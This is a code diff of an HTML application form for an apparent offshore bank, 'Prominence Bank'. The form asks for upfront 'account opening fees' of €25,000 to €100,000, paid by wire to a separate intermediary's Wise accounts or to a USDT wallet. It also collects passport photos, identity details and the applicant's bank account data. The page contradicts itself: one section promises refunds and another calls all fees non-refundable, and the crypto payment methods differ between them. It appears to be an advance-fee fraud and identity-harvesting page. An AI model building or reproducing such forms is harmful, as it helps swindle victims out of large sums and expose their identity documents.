@@ -1,138 +1,455 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Personal Bank Application</title>
-<link rel="stylesheet" href="assets/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Application Form</title>
+    <link rel="stylesheet" href="assets/style.css">
 </head>
-
 <body>
-
 <div class="bank-form-container">
 
-<!-- ACCOUNT TYPE TABS -->
-<div class="account-type-tabs">
-<button class="tab active" onclick="switchForm('personal')">Personal Account</button>
-<button class="tab" onclick="switchForm('corporate')">Corporate Account</button>
-</div>
+    <!-- tabs switching personal / corporate -->
+    <div class="account-type-tabs">
+        <button type="button" class="tab active" onclick="switchForm('personal')">Personal Account</button>
+        <button type="button" class="tab" onclick="switchForm('corporate')">Corporate Account</button>
+    </div>
 
-<!-- STEPS -->
+<!-- Steps Navigation -->
+
 <div class="steps">
-
 <div class="step active">Account Selection</div>
 <div class="step">Personal Profile</div>
 <div class="step">Transfer Activity</div>
 <div class="step">Funding & Account</div>
 <div class="step">Fee Payment</div>
 <div class="step">Payment Instructions</div>
-<div class="step">Agreed & Attested</div>
-
+<div class="step">Agreed and Attested</div>
 </div>
 
 <div class="progress-bar">
 <div class="progress"></div>
 </div>
 
+
 <form id="bankForm">
 
 <!-- STEP 1 -->
+
 <div class="form-step active">
-<h2>Select Account</h2>
 
-<label class="account-card">
-<input type="radio" name="account" checked>
-Savings Account
-</label>
+<h2>Apply for a New Personal Bank Account</h2>
 
-<label class="account-card">
-<input type="radio" name="account">
-Custody Account
-</label>
+<div class="account-card selected">
+<input type="radio" name="account" value="Savings" checked>
+<div>
+<h3>Savings Account</h3>
+<p>Account Opening Fee</p>
+</div>
+<span>€25,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account" value="Custody">
+<div>
+<h3>Custody Account</h3>
+<p>Account Opening Fee</p>
+</div>
+<span>€25,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account" value="Numbered">
+<div>
+<h3>Numbered Account</h3>
+<p>Account Opening Fee</p>
+</div>
+<span>€50,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account" value="Cryptocurrency">
+<div>
+<h3>Cryptocurrency Account</h3>
+<p>Account Opening Fee (Onboarding & Compliance Processing Fee)</p>
+</div>
+<span>€25,000</span>
+</div>
 
 <button type="button" class="next-btn">Continue</button>
+
 </div>
 
-<!-- STEP 2 -->
+<!-- STEP 2: Payment Instructions -->
+
 <div class="form-step">
-<h2>Personal Profile</h2>
-
-<input type="text" placeholder="Full Name">
-<input type="email" placeholder="Email">
-<input type="text" placeholder="Phone">
-
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="button" class="next-btn">Next</button>
-</div>
+	<h2>Account Opening Fee — Payment Instructions</h2>
+	<p style="font-style:italic;color:#6b7280;margin-bottom:18px;">Applicable to all new account types listed below.</p>
+	<div style="margin-bottom:18px;">
+		<strong>Account Opening Fee (Onboarding & Compliance Processing Fee)</strong><br>
+		<span style="color:#6b7280;font-size:15px;">Payment of the Account Opening Fee does not guarantee approval or account opening.</span>
+		<ul style="margin-top:12px;margin-bottom:12px;">
+			<li>€25,000 — Euro Account</li>
+			<li>$25,000 — USD Account</li>
+			<li>€25,000 — Custody Account</li>
+			<li>€25,000 — Cryptocurrency Account</li>
+			<li>€50,000 — Numbered Account</li>
+		</ul>
+	</div>
+	<div style="margin-bottom:18px;">
+		<strong>REFUND POLICY (NO EXCEPTIONS)</strong>
+		<p style="color:#6b7280;font-size:15px;">If the application is declined and no account is opened, the Account Opening Fee will be refunded in full by PCM (no PCM deductions). Refunds are issued to the original sender (same payment route) <strong>within ten (10) business days</strong> after the application is formally declined in the Bank’s records.<br><br>If the application is approved and an account is opened, the Account Opening Fee is deemed fully earned upon account opening and is <strong>non-refundable</strong>, as it covers completed onboarding, administrative coordination, and compliance processing services.</p>
+	</div>
+	<div style="margin-bottom:18px;">
+		<strong>PAYMENT OPTION 1: INTERNATIONAL WIRE (SWIFT)</strong>
+		<ul style="margin-top:8px;margin-bottom:8px;">
+			<li><strong>EURO (EUR) CURRENCY</strong><br>
+				<span style="color:#6b7280;font-size:15px;">
+					Bank Name: Wise Europe<br>
+					Bank Address: Rue du Trône 100, 3rd floor. Brussels. 1050. Belgium<br>
+					SWIFT Code: TRWIBEB1XXX<br>
+					Account Name: PROMINENCE CLIENT MANAGEMENT<br>
+					Account Number/IBAN: BE31905177979455<br>
+					Payment Reference / Memo <span style="color:#bfa14a;font-weight:600;">(REQUIRED)</span>: Application ID: 69aa9430 | Onboarding and Compliance Processing Fee
+				</span>
+			</li>
+			<li><strong>USD (US) CURRENCY</strong><br>
+				<span style="color:#6b7280;font-size:15px;">
+					Bank Name: Wise US Inc.<br>
+					Bank Address: 108 W 13th St, Wilmington, DE, 19801, United States<br>
+					SWIFT Code: TRWIUS35XXX<br>
+					Account Name: PROMINENCE CLIENT MANAGEMENT<br>
+					Account Number: 205414015428310<br>
+					Payment Reference / Memo <span style="color:#bfa14a;font-weight:600;">(REQUIRED)</span>: Application ID: 69aa9430 | Onboarding and Compliance Processing Fee
+				</span>
+			</li>
+		</ul>
+	</div>
+	<div style="margin-bottom:18px;">
+		<strong>PAYMENT OPTION 2: CRYPTOCURRENCY (USDT TRC20)</strong>
+		<ul style="margin-top:8px;margin-bottom:8px;">
+			<li><strong>USDT Wallet Address (TRC20):</strong> TPYjsZk3bZRZAVhBoRZcdyZkPq9NN6S6Y</li>
+			<li style="color:#6b7280;font-size:15px;">To validate a crypto payment, you must provide (i) TXID/transaction hash, (ii) amount sent, (iii) sending wallet address, and (iv) timestamp and supporting screenshot (if available).</li>
+		</ul>
+	</div>
+	<div class="info-text" style="margin-bottom:18px;">
+		<span style="color:#bfa14a;font-weight:600;">IMPORTANT NOTICE:</span> The Account Opening Fee must be paid via SWIFT international wire (Option 1), or USDT (Option 2). KTT / Telex are not accepted for this initial payment and will not be used to activate an account.
+	</div>
+	<h3>THIRD-PARTY ONBOARDING AND PAYMENT NOTICE</h3>
+	<p>Click to expand / view terms</p>
+	<p>This application may be supported by Prominence Client Management / Prominence Account Management (“PCM”), a separate legal entity acting as an independent introducer and providing administrative onboarding coordination only (intake support, document collection coordination, and application‑package transmission). PCM is not authorized to bind Prominence Bank or make representations regarding approval. PCM is not a bank and does not provide banking, deposit‑taking, securities brokerage, investment advisory, fiduciary, custody, wallet custody, or legal services. Prominence Bank alone determines whether to approve or decline an application and whether an account is opened. Any Account Opening Fee paid to PCM is a service fee for onboarding and compliance‑processing support; it is not a deposit with Prominence Bank and does not create or fund a bank account.</p>
+	<h4>SCOPE OF PCM SERVICES</h4>
+	<p>PCM services are limited to (i) assisting with completion of intake forms, (ii) coordinating collection of required documents, (iii) basic completeness checks (format/legibility), and (iv) transmitting the compiled application package to Prominence Bank. PCM does not provide advice, does not negotiate terms, does not handle client assets for investment or custody purposes, and does not represent that an application will be approved</p>
+	<input type="file" name="offshore_fees_payment_photo" accept="image/*">
+	<label>Insert Full Color Photo of your Offshore Account Opening Fees Payment</label>
+	<div class="nav-btns">
+		<button type="button" class="prev-btn">Previous</button>
+		<button type="button" class="next-btn">Continue</button>
+	</div>
 </div>
 
 <!-- STEP 3 -->
+
 <div class="form-step">
-<h2>Transfer Activity</h2>
 
-<input type="text" placeholder="Expected Monthly Transfer">
+<h2>Personal Profile</h2>
 
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="button" class="next-btn">Next</button>
+<div class="grid">
+  <input type="text" placeholder="Place of birth *" name="place_of_birth" required>
+  <input type="text" placeholder="First name *" name="first_name" required>
 </div>
+<div class="grid">
+  <input type="text" placeholder="Last name *" name="last_name" required>
+  <input type="text" placeholder="Middle name *" name="middle_name" required>
+</div>
+<div class="grid">
+  <input type="text" placeholder="Date of birth *" name="date_of_birth" required>
+  <input type="text" placeholder="Nationality *" name="nationality" required>
+</div>
+<div class="grid">
+  <input type="text" placeholder="Passport/ID No. *" name="passport_id_no" required>
+  <input type="text" placeholder="Passport/ID date of issue *" name="passport_issue_date" required>
+</div>
+<div class="grid">
+  <input type="text" placeholder="Passport/ID Expiration date *" name="passport_expiry_date" required>
+  <input type="tel" placeholder="Telephone No. *" name="telephone_no" required>
+</div>
+<div class="grid">
+  <input type="tel" placeholder="Fax No. *" name="fax_no" required>
+  <input type="text" placeholder="Country of issue *" name="country_of_issue" required>
+</div>
+<input type="text" placeholder="Home address *" name="home_address" required>
+<div class="grid">
+  <input type="email" placeholder="Email address *" name="email_address" required>
+  <input type="tel" placeholder="Mobile No. *" name="mobile_no" required>
+</div>
+<div class="grid">
+  <input type="text" placeholder="City" name="city">
+  <input type="text" placeholder="State" name="state">
+</div>
+<div class="grid">
+  <input type="text" placeholder="Zip code" name="zip_code">
+  <input type="text" placeholder="Country *" name="country" required>
+</div>
+<div class="nav-btns">
+  <button type="button" class="prev-btn">Previous</button>
+  <button type="button" class="next-btn">Continue</button>
+</div>
+
 </div>
 
 <!-- STEP 4 -->
+
 <div class="form-step">
-<h2>Funding & Account</h2>
 
-<input type="text" placeholder="Source of Funds">
+<h2>Expected Transfer Activity</h2>
 
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="button" class="next-btn">Next</button>
+<div class="grid">
+<input type="text" placeholder="Main countries to which you will make transfers" name="main_countries_out">
+<input type="text" placeholder="Main countries from which you will receive transfers" name="main_countries_in">
 </div>
+<div class="grid">
+<input type="text" placeholder="Estimated number of outgoing transfers per month" name="outgoing_transfers">
+<input type="text" placeholder="Estimated number of incoming transfers per month" name="incoming_transfers">
+</div>
+<div class="grid">
+<input type="text" placeholder="Average value for each transfer" name="average_value">
+<input type="text" placeholder="Maximum value of each transfer" name="max_value">
+</div>
+<input type="text" placeholder="Currency of initial funding" name="currency_funding">
+
+<h3>Source of initial funding</h3>
+
+<div class="grid">
+<input type="text" placeholder="Value of Initial Funding" name="initial_funding_value">
+<input type="text" placeholder="Originating Bank Name" name="originating_bank_name">
+</div>
+<input type="text" placeholder="Originating Bank Address" name="originating_bank_address">
+<div class="grid">
+<input type="text" placeholder="Account Name" name="account_name">
+<input type="text" placeholder="Account Number" name="account_number">
+</div>
+<input type="text" placeholder="Signatory Full Name" name="signatory_full_name">
+<textarea placeholder="Describe precisely how these funds were generated" name="funds_generated_description"></textarea>
+
+<div class="nav-btns">
+<button type="button" class="prev-btn">Previous</button>
+<button type="button" class="next-btn">Continue</button>
+</div>
+
 </div>
 
 <!-- STEP 5 -->
+
 <div class="form-step">
-<h2>Fee Payment</h2>
 
-<p>Account opening fee information.</p>
+<h2>Bank Account & Referral</h2>
 
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="button" class="next-btn">Next</button>
+<select name="account_currency">
+  <option>Select Currency</option>
+  <option>EUR</option>
+  <option>USD</option>
+  <option>GBP</option>
+</select>
+<input type="text" placeholder="Initial Deposit Amount" name="deposit_amount">
+
+<h2>Referral</h2>
+<input type="text" placeholder="How did you hear about us? (e.g. Professional Recommendation, LinkedIn, Search Engine)" name="referral">
+
+<div class="nav-btns">
+<button type="button" class="prev-btn">Previous</button>
+<button type="button" class="next-btn">Continue</button>
 </div>
+
 </div>
 
 <!-- STEP 6 -->
+
 <div class="form-step">
-<h2>Payment Instructions</h2>
 
-<p>Wire transfer details will appear here.</p>
+<h2>Fee Payment Bank Information</h2>
 
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="button" class="next-btn">Next</button>
+<div class="grid">
+  <input type="text" placeholder="Bank Name" name="bank_name">
+  <input type="text" placeholder="Bank Address" name="bank_address">
+</div>
+<div class="grid">
+  <input type="text" placeholder="Bank Swift Code" name="bank_swift_code">
+  <input type="text" placeholder="Account Holder Name" name="account_holder_name">
+</div>
+<div class="grid">
+  <input type="text" placeholder="Account Number" name="account_number">
+  <input type="text" placeholder="Account Signatory Name" name="account_signatory_name">
+</div>
+<textarea placeholder="Describe the Origin of Deposit Funds" name="deposit_funds_origin"></textarea>
+
+<h3>KYC/AML DOCUMENTATION NOTE</h3>
+<p>Upload option Image (Click to expand / view terms)</p>
+<input type="file" name="passport_photo" accept="image/*">
+<label>Insert Full Color Photo of your Passport Here *</label>
+
+<div class="nav-btns">
+<button type="button" class="prev-btn">Previous</button>
+<button type="button" class="next-btn">Continue</button>
 </div>
 </div>
 
 <!-- STEP 7 -->
+
 <div class="form-step">
-<h2>Agreed & Attested</h2>
 
-<label>
-<input type="checkbox"> I agree to the terms
-</label>
-
-<div class="buttons">
-<button type="button" class="prev-btn">Back</button>
-<button type="submit">Submit Application</button>
+<h2>Agreed and Attested</h2>
+<div class="info-text" style="background:#f5f7fa;padding:18px;border-radius:8px;margin-bottom:18px;border:1px solid #dbeafe;">
+  <strong>Third-Party Onboarding and Payment Notice</strong><br>
+  Please be advised that Prominence Bank may utilize third-party compliance and onboarding services. All payments for account opening fees are non-refundable and cover the cost of enhanced due diligence. Approval is not guaranteed and depends on successful compliance clearance.
+</div>
+<div class="info-text" style="background:#fffbe6;padding:18px;border-radius:8px;margin-bottom:18px;border:1px solid #ffe4a1;">
+  <strong>Account Opening Fee – Payment Instructions</strong><br>
+  The specified Account Opening Fee is due immediately upon submission of this application to initiate the onboarding process.<br>
+  <span style="font-weight:600;">Methods:</span> SWIFT/SEPA Transfer, BTC, or USDT (ERC20).<br>
+  <span style="font-weight:600;">Notification:</span> Instructions will be sent to your registered email.
+</div>
+<div style="background:#fff;padding:18px;border-radius:8px;border:1px solid #ececec;margin-bottom:18px;">
+  <input type="checkbox" name="declaration" id="declaration">
+  <label for="declaration" style="font-weight:600;">I/we hereby declare that the information given in this application form is true and correct. I/we agree to be bound by the terms and conditions of Prominence Bank. <span style="color:#bfa14a;">Required</span></label>
+</div>
+<div class="nav-btns">
+<button type="button" class="prev-btn">Previous</button>
+<button type="submit" class="submit-btn">Submit Application</button>
 </div>
 </div>
 
 </form>
 
+    <!-- corporate section (static preview) -->
+    <div class="form-section" id="corporate-section" style="display:none;">
+        <!-- corporate form copied from index-corporate but without outer container -->
+        <div class="steps">
+<div class="step active">Account Selection</div>
+<div class="step">Company Profile</div>
+<div class="step">Business Details</div>
+<div class="step">Signatory Information</div>
+<div class="step">Transfer Activity</div>
+<div class="step">Payment Instructions</div>
+<div class="step">Agreed and Attested</div>
 </div>
 
+<div class="progress-bar">
+<div class="progress"></div>
+</div>
+
+<form id="corporateForm">
+
+<!-- STEP 1: Account Selection -->
+<div class="form-step active">
+<h2>Select a Corporate Bank Account Type</h2>
+
+<div class="account-card selected">
+<input type="radio" name="account_type" value="Business_Checking" checked>
+<div>
+<h3>Business Checking Account</h3>
+<p>Account Opening Fee (Onboarding & Compliance Processing Fee)</p>
+</div>
+<span>€50,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account_type" value="Business_Savings">
+<div>
+<h3>Business Savings Account</h3>
+<p>Account Opening Fee (Onboarding & Compliance Processing Fee)</p>
+</div>
+<span>€50,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account_type" value="Merchant_Services">
+<div>
+<h3>Merchant Services Account</h3>
+<p>Account Opening Fee (Onboarding & Compliance Processing Fee)</p>
+</div>
+<span>€75,000</span>
+</div>
+
+<div class="account-card">
+<input type="radio" name="account_type" value="Trading_Account">
+<div>
+<h3>Trading/Investment Account</h3>
+<p>Account Opening Fee (Onboarding & Compliance Processing Fee)</p>
+</div>
+<span>€100,000</span>
+</div>
+
+<button type="button" class="next-btn">Continue</button>
+</div>
+
+<!-- STEP 2: Payment Instructions -->
+<div class="form-step">
+<h2>Account Opening Fee — Payment Instructions</h2>
+<p style="font-style:italic;color:#6b7280;margin-bottom:18px;">Applicable to all corporate account types listed below.</p>
+<div style="margin-bottom:18px;">
+<strong>Account Opening Fee (Onboarding & Compliance Processing Fee)</strong><br>
+<span style="color:#6b7280;font-size:15px;">Payment of the Account Opening Fee does not guarantee approval or account opening.</span>
+<ul style="margin-top:12px;margin-bottom:12px;">
+<li>€50,000 — Business Checking Account</li>
+<li>€50,000 — Business Savings Account</li>
+<li>€75,000 — Merchant Services Account</li>
+<li>€100,000 — Trading/Investment Account</li>
+</ul>
+</div>
+<div style="margin-bottom:18px;">
+<strong>REFUND POLICY (NO EXCEPTIONS)</strong>
+<p style="color:#6b7280;font-size:15px;">If the application is declined and no account is opened, the Account Opening Fee will be refunded in full. Refunds are issued to the original sender (same payment route) <strong>within ten (10) business days</strong> after the application is formally declined in the Bank's records.<br><br>If the application is approved and an account is opened, the Account Opening Fee is deemed fully earned upon account opening and is <strong>non-refundable</strong>, as it covers completed onboarding, administrative coordination, and compliance processing services.</p>
+</div>
+<div style="margin-bottom:18px;">
+<strong>PAYMENT OPTION 1: INTERNATIONAL WIRE (SWIFT)</strong>
+<ul style="margin-top:8px;margin-bottom:8px;">
+<li><strong>EURO (EUR) CURRENCY</strong><br>
+<span style="color:#6b7280;font-size:15px;">
+Bank Name: Wise Europe<br>
+Bank Address: Rue du Trône 100, 3rd floor. Brussels. 1050. Belgium<br>
+SWIFT Code: TRWIBEB1XXX<br>
+Account Name: PROMINENCE CLIENT MANAGEMENT<br>
+Account Number/IBAN: BE31905177979455<br>
+Payment Reference / Memo <span style="color:#bfa14a;font-weight:600;">(REQUIRED)</span>: Application ID: 69aa9430 | Onboarding and Compliance Processing Fee
+</span>
+</li>
+<li><strong>USD (US) CURRENCY</strong><br>
+<span style="color:#6b7280;font-size:15px;">
+Bank Name: Wise US Inc.<br>
+Bank Address: 108 W 13th St, Wilmington, DE, 19801, United States<br>
+SWIFT Code: TRWIUS35XXX<br>
+Account Name: PROMINENCE CLIENT MANAGEMENT<br>
+Account Number: 205414015428310<br>
+Payment Reference / Memo <span style="color:#bfa14a;font-weight:600;">(REQUIRED)</span>: Application ID: 69aa9430 | Onboarding and Compliance Processing Fee
+</span>
+</li>
+</ul>
+</div>
+<div style="margin-bottom:18px;">
+<strong>PAYMENT OPTION 2: CRYPTOCURRENCY (USDT TRC20)</strong>
+<ul style="margin-top:8px;margin-bottom:8px;">
+<li><strong>USDT Wallet Address (TRC20):</strong> TPYjsZk3bZRZAVhBoRZcdyZkPq9NN6S6Y</li>
+<li style="color:#6b7280;font-size:15px;">To validate a crypto payment, you must provide (i) TXID/transaction hash, (ii) amount sent, (iii) sending wallet address, and (iv) timestamp and supporting screenshot (if available).</li>
+</ul>
+</div>
+<input type="file" name="payment_proof" accept="image/*">
+<label>Insert Full Color Photo of your Offshore Account Opening Fees Payment</label>
+<div class="nav-btns">
+<button type="button" class="prev-btn">Previous</button>
+<button type="button" class="next-btn">Continue</button>
+</div>
+</div>
+
+<!-- additional corporate steps omitted for brevity -->
+
+</form>
+    </div>
+
+</div> <!-- end bank-form-container -->
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="assets/script.js"></script>
 <script>
 function switchForm(formType) {
     localStorage.setItem('selectedForm', formType);
@@ -155,7 +472,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
-<script src="assets/script.js"></script>
-
 </body>
 </html>
